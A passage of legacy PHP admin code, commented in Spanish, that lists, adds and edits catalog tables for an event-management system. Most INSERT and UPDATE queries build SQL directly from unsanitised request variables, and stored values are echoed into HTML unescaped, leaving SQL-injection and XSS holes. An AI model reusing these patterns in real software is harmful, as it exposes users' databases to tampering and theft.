           $rowubic = mysql_fetch_array($con_ubicacion);
           $ExisteReg = $rowubic[cantidad];
           mysql_free_result($con_ubicacion);

           if ($ExisteReg > 0) {
             // TipoEvento Existe en Tabla
                $error_accion_ms = "La Informaci�n que desea incorporar ha sido agregada previamente ..!!!";
                mensaje_error($error_accion_ms);
           } else {
            //Agregar a Tabla ubicacion
              mysql_query("INSERT INTO Ubicacion(idubicacion,ubicacion) VALUES('$nroubicacion','$nombreubicacion')") or DIE("Imposible Guardar Registro en Tabla ubicacion .. Ha Surgido un Problema Inesperado..!!");
             $aviso_accion_ms = "Se Ha Agregado la Siguiente Ubicacion ". $nombreubicacion. " ";
             mensaje_aviso($aviso_accion_ms);
           }
           mysql_close();

echo "</td></tr>";
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

if ($HTTP_GET_VARS['accion']=="edita_ubicacion"){
  $id = $HTTP_POST_VARS['id'];
  $id = trim($id);
  // Convertir a May�sculas Nombre de la Ubicacion
     $nombreubicacion = strtoupper($nombreubicacion);

   mysql_query("UPDATE Ubicacion SET ubicacion='$nombreubicacion' WHERE idubicacion='$id'") or DIE("Imposible Modificar Ubicacion .. !!!");
   mysql_close();
   header ("Location: $PHP_SELF?accion=ubicacion");
   exit;
}
// ----------------------------------------------- <<<    FIN Area de Ubicacion    >>> --------------------


// ----------------------------------------------- <<<    Area de TipoEvento    >>> --------------------
if ($HTTP_GET_VARS['accion'] == "tipoevento") {

      // Visualizar Registro de Tabla TipoEvento
      $con_tipoevento = mysql_query("SELECT *  FROM TipoEvento") or Die("Imposible Realizar Consulta a Tabla TipoEvento en estos Momentos ... Ha ocurrido un error inesperado.. !!! ");

      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraTipoEventoHTML();

       echo "<tr><td ColSpan=2 height=25></td></tr>";
       echo "<tr><td ColSpan=2>";
       if (mysql_num_rows($con_tipoevento) > 0 ) {
           echo('<table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
           echo('  <tr bgcolor=#dde5f2><td>Id. TipoEvento</td><td width=1bgcolor=#ffffff></td><td >Evento</td><td ColSpan=4></tr>');

           while($row=mysql_fetch_object($con_tipoevento)) {
             echo "<tr bgcolor=#eaeaea>";
             echo "<td align=center>$row->idtipoevento</td><td width=1 bgcolor=#ffffff></td>";
             echo "<td >$row->tipoevento</td><td width=1 bgcolor=#ffffff></td>";
echo <<< HTML
            <td align=center><a href="$PHP_SELF?accion=modifica_tipoevento&id=$row->idtipoevento"  class="orangenone">Modificar</td>
            <td width=1 bgcolor=#ffffff></td>
            <td align=center><a href="$PHP_SELF?accion=borra_tipoevento&id=$row->idtipoevento" class="orangenone">Eliminar</td>
HTML;
             echo "</tr>";
             echo "<tr bgcolor=#ffffff><td ColSpan=11 height=1></td></tr>";
           }
           echo "</table>";
       }
       mysql_free_result($con_tipoevento);
       mysql_close();
       echo "</td></tr>";
       echo "</table>";
       echo "</td></tr>";
       echo "</table>";
       restoHTML();
}

if ($HTTP_GET_VARS['accion'] == "agregar_tipoevento") {
   // Agregar TipoEvento
      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraTipoEventoHTML();

      $con_tipoevento = mysql_query("SELECT count(idtipoevento)as cantidad FROM TipoEvento") or Die("Imposible Realizar Consulta a Tabla TipoEvento .. Ha ocurrido un Error Inesperado .. !!!");
      $row = mysql_fetch_array($con_tipoevento);
      $numreg = $row[cantidad] + 1;
      mysql_free_result($con_tipoevento);

      echo "<tr><td ColSpan=2 height=25></td></tr>";
      echo "<tr><td valign=middle class=topmenu ColSpan=2><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Agrega TipoEvento</td></tr>";
      echo "<tr><td ColSpan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
      echo "<tr><td height=15 ColSpan=2></td></tr>";
      echo "<tr><td ColSpan=2>";
      echo(' <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
      echo "   <tr align=center bgcolor=#dde5f2>";
echo <<< HTML
                <form method="post" action="$PHP_SELF?accion=nueva_tipoevento" onSubmit="return validaTipoEvento();" name="form">
                <td>Id. TipoEvento</td><td>TipoEvento</td>
               </tr>
               <tr align="center" bgcolor=#eaeaea>
                <td><input type=text name=nrotipoevento size=6 maxlength=6 class=eninput value="$numreg" onKeyPress="return numbersonly(this, event)">&nbsp;</td>
                <td><input type=text name=nombretipoevento size=30 maxlength=30 class=eninput>&nbsp;</td>
               </tr>
               <tr align="center" bgcolor=#ffffff>
                <td ColSpan="2" class="nota">Id. TipoEvento debe ser valor num&eacute;rico</td>
               </tr>
               <tr><td height=15 ColSpan="2"></td></tr>
               <tr bgcolor="#ffffff">
                <td colspan="2" height="40">
                 <div align="center">
                   <input type="image" name="agregaregion" src="../imagenes/agregar.gif">
                 </div>
                </td>
               </tr>
              <tr>
               <td colspan="2" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../imagenes/volver.gif" border="0"></a>
               </td>
              </tr>
              <tr><td height=5 ColSpan="2"></td></tr>
              <tr><td ColSpan="2" valign=middle background='../imagenes/linea.gif'></td></tr>
              </form>
            </table>
        </td>
      </tr>
HTML;
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

if ($HTTP_GET_VARS['accion'] == "nueva_tipoevento") {
  // Agregar Nuevo Tipo de Evento  a Tabla TipoEvento
    echo "<tr><td ColSpan=2 height=25></td></tr>";
    echo "<tr><td ColSpan=2>";

    // Chequear Variables


       // Convertir a May�sculas Nombre del TipoEvento
          $nombretipoevento = strtoupper($nombretipoevento);

       // Chequear en Tabla TipoEvento, existencia de dato a ingresar
         $con_tipoevento = mysql_query("SELECT count(*) as cantidad FROM TipoEvento WHERE idtipoevento=$nrotipoevento") Or DIE("Imposible Relizar Consulta en Tabla TipoEvento en este Momento ... Intente Nuevamente");
           $rowtipoev = mysql_fetch_array($con_tipoevento);
           $ExisteReg = $rowtipoev[cantidad];
           mysql_free_result($con_tipoevento);

           if ($ExisteReg > 0) {
             // TipoEvento Existe en Tabla
                $error_accion_ms = "La Informaci�n que desea incorporar ha sido agregada previamente ..!!!";
                mensaje_error($error_accion_ms);
           } else {
            //Agregar a Tabla TipoEvento
              mysql_query("INSERT INTO TipoEvento(idtipoevento,tipoevento) VALUES('$nrotipoevento','$nombretipoevento')") or DIE("Imposible Guardar Registro en Tabla TipoEvento .. Ha Surgido un Problema Inesperado..!!");
             $aviso_accion_ms = "Se Ha Agregado el Siguiente Tipo de Evento ". $nombretipoevento. " ";
             mensaje_aviso($aviso_accion_ms);
           }
           mysql_close();

echo "</td></tr>";
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

if ($HTTP_GET_VARS['accion']=="edita_tipoevento"){
  $id = $HTTP_POST_VARS['id'];
  $id = trim($id);
  // Convertir a May�sculas Nombre del TipoEvento
     $nombretipoevento = strtoupper($nombretipoevento);

   mysql_query("UPDATE TipoEvento SET tipoevento='$nombretipoevento' WHERE idtipoevento='$id'") or DIE("Imposible Modificar Tipo de Evento .. !!!");
   mysql_close();
   header ("Location: $PHP_SELF?accion=tipoevento");
   exit;
}
// ----------------------------------------------- <<<    FIN Area de TipoEvento    >>> --------------------

// ----------------------------------------------- <<<    Area de Capacidad de Respuesta    >>> ------------
if ($HTTP_GET_VARS['accion'] == "nivelrespuesta") {

      // Visualizar Registro de Tabla NivelRespuesta
      $con_nivelrespuesta = mysql_query("SELECT *  FROM CapRespuesta") or Die("Imposible Realizar Consulta a Tabla Nivel de Respuesta en estos Momentos ... Ha ocurrido un error inesperado.. !!! ");

      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraNivelRespuestaHTML();

       echo "<tr><td ColSpan=2 height=25></td></tr>";
       echo "<tr><td ColSpan=2>";
       if (mysql_num_rows($con_nivelrespuesta) > 0 ) {
           echo('<table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
           echo('  <tr bgcolor=#dde5f2><td>Id. Nivel</td><td width=1bgcolor=#ffffff></td><td >Nivel</td><td ColSpan=4></
tr>');

           while($row=mysql_fetch_object($con_nivelrespuesta)) {
             echo "<tr bgcolor=#eaeaea>";
             echo "<td align=center>$row->idcapresp</td><td width=1 bgcolor=#ffffff></td>";
             echo "<td >$row->nivel</td><td width=1 bgcolor=#ffffff></td>";
echo <<< HTML
            <td align=center><a href="$PHP_SELF?accion=modifica_nivelrespuesta&id=$row->idcapresp"  class="orangenone">Modificar</td>
            <td width=1 bgcolor=#ffffff></td>
            <td align=center><a href="$PHP_SELF?accion=borra_nivelrespuesta&id=$row->idcapresp" class="orangenone">Eliminar</td>
HTML;
             echo "</tr>";
             echo "<tr bgcolor=#ffffff><td ColSpan=11 height=1></td></tr>";
           }
           echo "</table>";
       }
       mysql_free_result($con_nivelrespuesta);
       mysql_close();
       echo "</td></tr>";
       echo "</table>";
       echo "</td></tr>";
       echo "</table>";
       restoHTML();
}

if ($HTTP_GET_VARS['accion'] == "agregar_nivelrespuesta") {
   // Agregar NivelRespuesta
      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraNivelRespuestaHTML();

      $con_cantinivel = mysql_query("SELECT count(idcapresp) as cantidad FROM CapRespuesta") or Die("Imposible Realizar Consulta a Tabla Capacidad de Respuesta .. Ha ocurrido un Error Inesperado .. !!!");
      $row = mysql_fetch_array($con_cantinivel);
      $numreg = 0;
      $numreg = $row[cantidad] + 1;
      mysql_free_result($con_cantinivel);
      mysql_close();

      echo "<tr><td ColSpan=2 height=25></td></tr>";
      echo "<tr><td valign=middle class=topmenu ColSpan=2><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Agrega Nivel de Respuesta</td></tr>";
      echo "<tr><td ColSpan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
      echo "<tr><td height=15 ColSpan=2></td></tr>";
      echo "<tr><td ColSpan=2>";
      echo(' <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
      echo "   <tr align=center bgcolor=#dde5f2>";
echo <<< HTML
                <form method="post" action="$PHP_SELF?accion=nueva_nivelrespuesta" onSubmit="return validaNivelRespuesta();" name="form">
                <td>Id. Nivel</td><td>Nivel</td>
               </tr>
               <tr align="center" bgcolor=#eaeaea>
                <td><input type=text name=nrocaprespuesta size=6 maxlength=6 class=eninput value="$numreg" onKeyPress="return numbersonly(this, event)">&nbsp;</td>
                <td><input type=text name=nombrenivel size=30 maxlength=30 class=eninput tabindex=2>&nbsp;</td>
               </tr>
               <tr align="center" bgcolor=#ffffff>
                <td ColSpan="2" class="nota">Id. Nivel debe ser valor num&eacute;rico</td>
               </tr>
               <tr><td height=15 ColSpan="2"></td></tr>
               <tr bgcolor="#ffffff">
                <td colspan="2" height="40">
                 <div align="center">
                   <input type="image" name="agregaregion" src="../imagenes/agregar.gif">
                 </div>
                </td>
               </tr>
              <tr>
               <td colspan="2" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../im
agenes/volver.gif" border="0"></a>
               </td>
              </tr>
              <tr><td height=5 ColSpan="2"></td></tr>
              <tr><td ColSpan="2" valign=middle background='../imagenes/linea.gif'></td></tr>
              </form>
            </table>
        </td>
      </tr>
HTML;
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

if ($HTTP_GET_VARS['accion'] == "nueva_nivelrespuesta") {
    // Agregar Nuevo Nivel de Capacidad de Respuesta a Tabla CapRespuesta
    echo "<tr><td ColSpan=2 height=25></td></tr>";
    echo "<tr><td ColSpan=2>";

    // Chequear Variables
       $ExisteReg = 0;

       if (strlen($nrocaprespuesta) == 1 ) {
           $nrocaprespuesta = "0". $nrocaprespuesta;
       }

       // Convertir a May�sculas Nombre del Nivel
          $nombrenivel = strtoupper($nombrenivel);

       // Chequear en Tabla CapRespuesta, existencia de dato a ingresar
       $con_existenivel = mysql_query("SELECT count(*) as cantidad FROM CapRespuesta where idcapresp='$nrocaprespuesta'") Or DIE("Imposible Relizar Consulta en Tabla Capacidad de Respuesta en este Momento ... Intente Nuevamente");

          $rowexistenivel = mysql_fetch_array($con_existenivel);
          $ExisteReg = $rowexistenivel[cantidad];
          mysql_free_result($con_existenivel);


          if ($ExisteReg >= 1) {
             // Nivel de Respuesta Existe en Tabla
                $error_accion_ms = "La Informaci�n que desea incorporar ha sido agregada previamente ..!!!";
                mensaje_error($error_accion_ms);
           } else {
            //Agregar a Tabla NivelRespuesta
              mysql_query("INSERT INTO CapRespuesta(idcapresp,nivel) VALUES('$nrocaprespuesta','$nombrenivel')") or DIE("Imposible Guardar Registro en Tabla Capacidad de Respuesta .. Ha Surgido un Problema Inesperado..!!");
              mysql_close();
              $aviso_accion_ms = "Se Ha Agregado el Siguiente Nivel de Respuesta ". $nombrenivel. " ";
              mensaje_aviso($aviso_accion_ms);
           }
        echo "</td></tr>";
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

if ($HTTP_GET_VARS['accion']=="edita_nivelrespuesta"){
  $id = $HTTP_POST_VARS['id'];
  $id = trim($id);
  // Convertir a May�sculas Nombre del Nivel de Respuesta
     $nombrenivel = strtoupper($nombrenivel);

      mysql_query("UPDATE CapRespuesta SET nivel='$nombrenivel' WHERE idcapresp='$id'") or DIE("Imposible Modificar Nivel de Respuesta .. !!!");
   mysql_close();
   header ("Location: $PHP_SELF?accion=nivelrespuesta");
   exit;
}
// ----------------------------------------------- <<<    FIN Area de Capacidad de Respuesta    >>> ------------


// ----------------------------------------------- <<<    Area de Estado Alfa    >>> ------------
if ($HTTP_GET_VARS['accion'] == "estadoalfa") {

      // Visualizar Registro de Tabla EstadoAlfa
      $con_estadoalfa = mysql_query("SELECT *  FROM EstadoAlfa") or Die("Imposible Realizar Consulta a Tabla Estado Alfa en estos Momentos ... Ha ocurrido un error inesperado.. !!! ");

      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraEstadoAlfaHTML();

       echo "<tr><td ColSpan=2 height=25></td></tr>";
       echo "<tr><td ColSpan=2>";
       if (mysql_num_rows($con_estadoalfa) > 0 ) {
           echo('<table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
           echo('  <tr bgcolor=#dde5f2><td>Id.Estado</td><td width=1 bgcolor=#ffffff></td><td >Estado Alfa</td><td ColSpan=4></tr>');

           while($row=mysql_fetch_object($con_estadoalfa)) {
             echo "<tr bgcolor=#eaeaea>";
             echo "<td align=center>$row->idestadoalfa</td><td width=1 bgcolor=#ffffff></td>";
             echo "<td >$row->estadoalfa</td><td width=1 bgcolor=#ffffff></td>";
echo <<< HTML
            <td align=center><a href="$PHP_SELF?accion=modifica_estadoalfa&id=$row->idestadoalfa"  class="orangenone">Modificar</td>
            <td width=1 bgcolor=#ffffff></td>
            <td align=center><a href="$PHP_SELF?accion=borra_estadoalfa&id=$row->idestadoalfa" class="orangenone">Eliminar</td>
HTML;
             echo "</tr>";
             echo "<tr bgcolor=#ffffff><td ColSpan=11 height=1></td></tr>";
           }
           echo "</table>";
       }
       mysql_free_result($con_estadoalfa);
       mysql_close();
       echo "</td></tr>";
       echo "</table>";
       echo "</td></tr>";
       echo "</table>";
       restoHTML();
}

if ($HTTP_GET_VARS['accion'] == "agregar_estadoalfa") {
   // Agregar EstadoAlfa
      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraEstadoAlfaHTML();

      $con_estadoalfa = mysql_query("SELECT count(idestadoalfa)as cantidad FROM EstadoAlfa") or Die("Imposible Realizar Consulta a Tabla EstadoAlfa .. Ha ocurrido un Error Inesperado .. !!!");
      $row = mysql_fetch_array($con_estadoalfa);
      $numreg = $row[cantidad] + 1;
      mysql_free_result($con_estadoalfa);
      mysql_close();

      echo "<tr><td ColSpan=2 height=25></td></tr>";
      echo "<tr><td valign=middle class=topmenu ColSpan=2><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Agrega EstadoAlfa</td></tr>";
      echo "<tr><td ColSpan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
      echo "<tr><td height=15 ColSpan=2></td></tr>";
      echo "<tr><td ColSpan=2>";
      echo(' <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
      echo "   <tr align=center bgcolor=#dde5f2>";
echo <<< HTML
               <form method="post" action="$PHP_SELF?accion=nueva_estadoalfa" onSubmit="return validaEstadoAlfa();" name="form">
                <td>Id. Estado</td><td>Estado Alfa</td>
               </tr>
               <tr align="center" bgcolor=#eaeaea>
                <td><input type=text name=nroestadoalfa size=2 maxlength=2 class=eninput value="$numreg" OnKeyPress="return numbersonly(this, event)">&nbsp;</td>
                <td><input type=text name=nombreestadoalfa size=30 maxlength=30 class=eninput>&nbsp;</td>
               </tr>
               <tr align="left" bgcolor=#ffffff>
                <td ColSpan="2" class="nota">Id. Estado debe ser valor num&eacute;rico</td>
               </tr>
               <tr><td height=15 ColSpan="2"></td></tr>
               <tr bgcolor="#ffffff">
                <td colspan="2" height="40">
                 <div align="center">
                   <input type="image" name="agregaestadoalfa" src="../imagenes/agregar.gif">
                 </div>
                </td>
               </tr>
              <tr>
               <td colspan="2" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../imagenes/volver.gif" border="0"></a>
               </td>
              </tr>
              <tr><td height=5 ColSpan="2"></td></tr>
              <tr><td ColSpan="2" valign=middle background='../imagenes/linea.gif'></td></tr>
              </form>
            </table>
        </td>
      </tr>
HTML;
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

if ($HTTP_GET_VARS['accion'] == "nueva_estadoalfa") {
  // Agregar Nuevo Estado Alfa a Tabla EstadoAlfa
    echo "<tr><td ColSpan=2 height=25></td></tr>";
    echo "<tr><td ColSpan=2>";

    // Chequear Variables

       // Convertir a May�sculas Nombre del Estado Alfa
          $nombreestadoalfa = strtoupper($nombreestadoalfa);

       // Chequear en Tabla EstadoAlfa, existencia de dato a ingresar
         $con_estadoalfa = mysql_query("SELECT idestadoalfa FROM EstadoAlfa WHERE idestadoalfa='$nroestadoalfa'") Or DIE("Imposible Relizar Consulta en Tabla EstadoAlfa en este Momento ... Intente Nuevamente");

           if ($row=mysql_num_rows($con_estadoalfa) > 0) {
             // EstadoAlfa Existe en Tabla
                $error_accion_ms = "La Informaci�n que desea incorporar ha sido agregada previamente ..!!!";
                mensaje_error($error_accion_ms);
           } else {
            //Agregar a Tabla EstadoAlfa
              mysql_query("INSERT INTO EstadoAlfa(idestadoalfa,estadoalfa) VALUES('$nroestadoalfa','$nombreestadoalfa')") or DIE("Imposible Guardar Registro en Tabla EstadoAlfa .. Ha Surgido un Problema Inesperado..!!");

             $aviso_accion_ms = "Se Ha Agregado el Siguiente Estado Alfa ". $nombreestadoalfa. " ";
             mensaje_aviso($aviso_accion_ms);

             mysql_free_result($con_estadoalfa);
             mysql_close();
           }
        echo "</td></tr>";
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}


if ($HTTP_GET_VARS['accion']=="edita_estadoalfa"){
  $id = $HTTP_POST_VARS['id'];
  $id = trim($id);
  // Convertir a May�sculas Nombre del Estado Alfa
     $nombreestadoalfa = strtoupper($nombreestadoalfa);

     mysql_query("UPDATE EstadoAlfa SET estadoalfa='$nombreestadoalfa' WHERE idestadoalfa='$id'") or DIE("Imposible Modificar Estado Alfa .. !!!");
   mysql_close();
   header ("Location: $PHP_SELF?accion=estadoalfa");
   exit;
}
// ----------------------------------------------- <<<    FIN Area de Estado Alfa    >>> ------------


// ----------------------------------------------- <<<    Area de Estado Evento    >>> ------------
if ($HTTP_GET_VARS['accion'] == "estadoevento") {

      // Visualizar Registro de Tabla EstadoEvento
      $con_estadoevento = mysql_query("SELECT *  FROM EstadoEvento") or Die("Imposible Realizar Consulta a Tabla Estado Evento en estos Momentos ... Ha ocurrido un error inesperado.. !!! ");

      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraEstadoEventoHTML();

       echo "<tr><td ColSpan=2 height=25></td></tr>";
       echo "<tr><td ColSpan=2>";
       if (mysql_num_rows($con_estadoevento) > 0 ) {
           echo('<table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
           echo('  <tr bgcolor=#dde5f2><td>Id.Estado</td><td width=1 bgcolor=#ffffff></td><td >Estado Evento</td><td ColSpan=4></tr>');

           while($row=mysql_fetch_object($con_estadoevento)) {
             echo "<tr bgcolor=#eaeaea>";
             echo "<td align=center>$row->idestadoevento</td><td width=1 bgcolor=#ffffff></td>";
             echo "<td >$row->estadoevento</td><td width=1 bgcolor=#ffffff></td>";
echo <<< HTML
            <td align=center><a href="$PHP_SELF?accion=modifica_estadoevento&id=$row->idestadoevento"  class="orangenone">Modificar</td>
            <td width=1 bgcolor=#ffffff></td>
            <td align=center><a href="$PHP_SELF?accion=borra_estadoevento&id=$row->idestadoevento" class="orangenone">Eliminar</td>
HTML;
             echo "</tr>";
             echo "<tr bgcolor=#ffffff><td ColSpan=11 height=1></td></tr>";
           }
           echo "</table>";
       }
       mysql_free_result($con_estadoevento);
       mysql_close();
       echo "</td></tr>";
       echo "</table>";
       echo "</td></tr>";
       echo "</table>";
       restoHTML();
}

if ($HTTP_GET_VARS['accion'] == "agregar_estadoevento") {
   // Agregar Estadoevento
      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraEstadoEventoHTML();

      $con_estadoevento = mysql_query("SELECT count(idestadoevento) as cantidad FROM EstadoEvento") or Die("Imposible Realizar Consulta a Tabla EstadoEvento .. Ha ocurrido un Error Inesperado .. !!!");
      $row = mysql_fetch_array($con_estadoevento);
      $numreg = $row[cantidad] + 1;
      mysql_free_result($con_estadoevento);
      mysql_close();

      echo "<tr><td ColSpan=2 height=25></td></tr>";
      echo "<tr><td valign=middle class=topmenu ColSpan=2><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Agrega EstadoAlfa</td></tr>";
      echo "<tr><td ColSpan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
      echo "<tr><td height=15 ColSpan=2></td></tr>";
      echo "<tr><td ColSpan=2>";
      echo(' <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
      echo "   <tr align=center bgcolor=#dde5f2>";
echo <<< HTML
                <form method="post" action="$PHP_SELF?accion=nueva_estadoevento" onSubmit="return validaEstadoEvento();" name="form">
                <td>Id. Estado</td><td>Estado Evento</td>
               </tr>
               <tr align="center" bgcolor=#eaeaea>
                <td><input type=text name=nroestadoevento size=2 maxlength=2 class=eninput value="$numreg" OnKeyPress="return numbersonly(this, event)">&nbsp;</td>
                <td><input type=text name=nombreestadoevento size=30 maxlength=30 class=eninput>&nbsp;</td>
               </tr>
               <tr align="left" bgcolor=#ffffff>
                <td ColSpan="2" class="nota">Id. Estado debe ser valor num&eacute;rico</td>
               </tr>
               <tr><td height=15 ColSpan="2"></td></tr>
               <tr bgcolor="#ffffff">
                <td colspan="2" height="40">
                 <div align="center">
                   <input type="image" name="agregaestadoevento" src="../imagenes/agregar.gif">
                 </div>
                </td>
               </tr>
              <tr>
                <td colspan="2" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../imagenes/volver.gif" border="0"></a>
               </td>
              </tr>
              <tr><td height=5 ColSpan="2"></td></tr>
              <tr><td ColSpan="2" valign=middle background='../imagenes/linea.gif'></td></tr>
              </form>
            </table>
        </td>
      </tr>
HTML;
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}

if ($HTTP_GET_VARS['accion'] == "nueva_estadoevento") {
  // Agregar Nuevo Estado Alfa a Tabla EstadoEvento
    echo "<tr><td ColSpan=2 height=25></td></tr>";
    echo "<tr><td ColSpan=2>";

    // Chequear Variables

       // Convertir a May�sculas Nombre del Estado evento
          $nombreestadoevento = strtoupper($nombreestadoevento);

       // Chequear en Tabla Estadoevento, existencia de dato a ingresar
         $con_estadoevento = mysql_query("SELECT idestadoevento FROM EstadoEvento WHERE idestadoevento='$nroestadoevento'") Or DIE("Imposible Relizar Consulta en Tabla EstadoEvento en este Momento ... Intente Nuevamente");

           if ($row=mysql_num_rows($con_estadoevento) > 0) {
             // Estadoevento Existe en Tabla
                $error_accion_ms = "La Informaci�n que desea incorporar ha sido agregada previamente ..!!!";
                mensaje_error($error_accion_ms);
           } else {
            //Agregar a Tabla Estadoevento
              mysql_query("INSERT INTO EstadoEvento(idestadoevento,estadoevento) VALUES('$nroestadoevento','$nombreestadoevento')") or DIE("Imposible Guardar Registro en Tabla EstadoEvento .. Ha Surgido un Problema Inesperado..!!");

             $aviso_accion_ms = "Se Ha Agregado el Siguiente Estado Evento ". $nombreestadoevento. " ";
             mensaje_aviso($aviso_accion_ms);

             mysql_free_result($con_estadoevento);
             mysql_close();
           }
        echo "</td></tr>";
echo "</td></tr>";
echo "</table>";
echo "</td></tr>";
echo "</table>";
restoHTML();
}


if ($HTTP_GET_VARS['accion']=="edita_estadoevento"){
  $id = $HTTP_POST_VARS['id'];
  $id = trim($id);
  // Convertir a May�sculas Nombre del Estado evento
     $nombreestadoevento = strtoupper($nombreestadoevento);

      mysql_query("UPDATE EstadoEvento SET estadoevento='$nombreestadoevento' WHERE idestadoevento='$id'") or DIE("Imposible Modificar Estado Evento .. !!!");
   mysql_close();
   header ("Location: $PHP_SELF?accion=estadoevento");
   exit;
}
// ----------------------------------------------- <<<    FIN Area de Estado Evento    >>> ------------


// ----------------------------------------------- <<<    Area de Tipo de Recurso    >>> ------------
if ($HTTP_GET_VARS['accion'] == "tiporecurso") {

      // Visualizar Registro de Tabla tiporecurso
      $con_tiporecurso = mysql_query("SELECT *  FROM TipoRecurso") or Die("Imposible Realizar Consulta a Tabla TipoRecurso en estos Momentos ... Ha ocurrido un error inesperado.. !!! ");

      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraTipoRecursoHTML();

       echo "<tr><td ColSpan=2 height=25></td></tr>";
       echo "<tr><td ColSpan=2>";
       if (mysql_num_rows($con_tiporecurso) > 0 ) {
           echo('<table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
           echo('  <tr bgcolor=#dde5f2><td>Id.Tipo</td><td width=1 bgcolor=#ffffff></td><td >Tipo Recurso</td><td ColSpan=4></tr>');

           while($row=mysql_fetch_object($con_tiporecurso)) {
             echo "<tr bgcolor=#eaeaea>";
             echo "<td align=center>$row->idtiporecurso</td><td width=1 bgcolor=#ffffff></td>";
             echo "<td >$row->recurso</td><td width=1 bgcolor=#ffffff></td>";
echo <<< HTML
            <td align=center><a href="$PHP_SELF?accion=modifica_tiporecurso&id=$row->idtiporecurso"  class="orangenone">Modificar</td>
            <td width=1 bgcolor=#ffffff></td>
            <td align=center><a href="$PHP_SELF?accion=borra_tiporecurso&id=$row->idtiporecurso" class="orangenone">Eliminar</td>
HTML;
             echo "</tr>";
             echo "<tr bgcolor=#ffffff><td ColSpan=11 height=1></td></tr>";
           }
           echo "</table>";
       }
       mysql_free_result($con_tiporecurso);
       mysql_close();
       echo "</td></tr>";
       echo "</table>";
       echo "</td></tr>";
       echo "</table>";
       restoHTML();
}

if ($HTTP_GET_VARS['accion'] == "agregar_tiporecurso") {
   // Agregar TipoRecurso
      cabeceraHTML();
      cabeceraUsualHTML();
      cabeceraTipoRecursoHTML();

      $con_tiporecurso = mysql_query("SELECT count(idtiporecurso) as cantidad FROM TipoRecurso") or Die("Imposible Realizar Consulta a Tabla Tipo Recurso .. Ha ocurrido un Error Inesperado .. !!!");
      $row = mysql_fetch_array($con_tiporecurso);
      $numreg = $row[cantidad] + 1;
      mysql_free_result($con_tiporecurso);
      mysql_close();

      echo "<tr><td ColSpan=2 height=25></td></tr>";
      echo "<tr><td valign=middle class=topmenu ColSpan=2><img src='../imagenes/linvert_acc.gif' border=0 align=center valign=middle>Agrega Alerta</td></tr>";
      echo "<tr><td ColSpan=2 valign=middle background='../imagenes/linea.gif'></td></tr>";
      echo "<tr><td height=15 ColSpan=2></td></tr>";
      echo "<tr><td ColSpan=2>";
      echo(' <table width="100%" border="0" cellpadding="0" cellspacing="0" class="tablebodytext" bgcolor="#FFFFFF">');
      echo "   <tr align=center bgcolor=#dde5f2>";
echo <<< HTML
                <form method="post" action="$PHP_SELF?accion=nueva_tiporecurso" onSubmit="return validaTipoRecurso();" name="form">
                <td>Id. Tipo</td><td>Tipo Recurso</td>
               </tr>
               <tr align="center" bgcolor=#eaeaea>
                 <td><input type=text name=nrotiporecurso size=2 maxlength=2 class=eninput value="$numreg" OnKeyPress="return numbersonly(this, event)">&nbsp;</td>
                <td><input type=text name=nombrerecurso size=30 maxlength=30 class=eninput>&nbsp;</td>
               </tr>
               <tr align="left" bgcolor=#ffffff>
                <td ColSpan="2" class="nota">Id. Tipo debe ser valor num&eacute;rico</td>
               </tr>
               <tr><td height=15 ColSpan="2"></td></tr>
               <tr bgcolor="#ffffff">
                <td colspan="2" height="40">
                 <div align="center">
                   <input type="image" name="agregatiporecurso" src="../imagenes/agregar.gif">
                 </div>
                </td>
               </tr>
              <tr>
               <td colspan="2" height="30" bgcolor="#ffffff" align="right"><a href="javascript:history.back()"><img src="../imagenes/volver.gif" border="0"></a>
               </td>
              </tr>
              <tr><td height=5 ColSpan="2"></td></tr>
              <tr><td ColSpan="2" valign=middle background='../imagenes/linea.gif'></td></tr>
              </form>
            </table>
        </td>
      </tr>
HTML;
echo "</td></tr>";
